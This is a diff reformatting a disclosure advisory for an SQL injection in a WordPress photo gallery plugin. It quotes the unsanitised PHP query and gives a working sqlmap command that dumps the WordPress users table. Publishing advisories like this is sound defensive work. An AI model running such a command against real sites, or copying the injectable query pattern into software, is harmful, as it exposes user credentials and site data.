@@ -1,27 +1,34 @@
 SQL Injection in Photo Gallery  Wordpress plugin 
----------------------------------------------
+=====
 
-*About*: Photo Gallery  as described on the site:
+### Credit
+This vulnerability has been discovered and reported by Carl Clegg (carl(at)cjc(dot)im)
 
-> Gallery - Photo Gallery is a cool responsive image gallery plugin with beautifully views. Which allows you to add unlimited count of images in your prefered format. 
-
-*Description*: The `gall_id` parameter when editing a gallery allows for SQL injection 
-
-*Vendor*: [AYS Pro](http://ays-pro.com)
-
-*Timeline*
-
+### Timeline
 * 2016-07-05: Vendor Notified
+* 2016-11-21 Advisory Published
 
-*Vulnerability*: The file `AYS_Gall_Main.php`'s edit function fails to sanitize the gall_id url parameter, allowing SQL injection:
+### Product
+Photo Gallery is a cool responsive image gallery plugin with beautifully views. Which allows you to add unlimited count of images in your prefered format. 
+
+### Risk / Severity Rating
+Not calculated
+
+### Description and Impact
+The file `AYS_Gall_Main.php`'s edit function fails to sanitize the gall_id url parameter, allowing SQL injection:
 
 	$ays_gallery_id = $_GET["gall_id"];
         $res = $wpdb->get_row("SELECT * FROM ".$ays_gallery_table." WHERE id=".$ays_gallery_id."");
 
-*Proof of Concept*: Using sqlmap
 
+### Proof of Concept
 `sqlmap --cookie="<insert Cookie here>" -u "http://wp.site/wp-admin/admin.php?page=ays_gall_main&gall_id=1&action=edit" --dbms=MYSQL -o -p "gall_id" --dump -T wp_users` 
 
- would dump the users table from the Wordpress database.
+### Solution
+Disable the plugin until an upgrade is available
 
-*Further Reading*: More information on SQLi [here](https://www.owasp.org/index.php/SQL_Injection)
+### References
+*SQLi [here](https://www.owasp.org/index.php/SQL_Injection)
+
+### Legal
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
